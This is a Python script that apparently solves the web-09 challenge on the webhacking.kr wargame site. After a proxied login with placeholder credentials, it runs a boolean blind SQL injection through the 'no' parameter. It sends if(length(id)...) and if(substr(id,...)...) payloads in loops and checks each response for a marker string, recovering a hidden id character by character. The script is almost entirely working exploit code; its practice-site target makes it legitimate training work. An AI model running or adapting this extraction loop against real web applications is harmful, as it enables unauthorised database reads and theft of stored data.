import requests
s = requests.Session()
proxyList = {'http':'127.0.0.1:8000',
             'https':'127.0.0.1:8000'}
def login():
    
    url = 'https://webhacking.kr/login.php?login'
    login = {'id':'계정명',
             'pw':'패스워드'}
    response = s.post(url, data=login, proxies=proxyList, verify=False)
    response.status_code
    print (response.text)
def payload():
    
    login(); TrustKey = "Secret" ; code=''
    for i in range(1,20):
        url = "https://webhacking.kr/challenge/web-09/?no=if(length(id)in({}),3,0)".format(str(i))
        response = s.get(url, proxies=proxyList, verify=False)
        response.status_code
        res = response.text
        leng = i
    
        if(res.find(TrustKey)!=-1):
            print ("[-] Find Out Length Of ID : {}".format(str(leng)))
            break
            
    for i in range(1,leng+1):
        for j in range(65, 128):
            url = "https://webhacking.kr/challenge/web-09/?no=if(substr(id,{},1)in('{}'),3,0)".format(str(i),chr(j))
            response = s.get(url, proxies=proxyList, verify=False)
            response.status_code
            res = response.text
            
            if(res.find(TrustKey)!=-1):
                code = code + str(chr(j))
                print ("[-] Find Out Of ID : {}".format(str(code)))
                break
    
    print (code)
            
payload()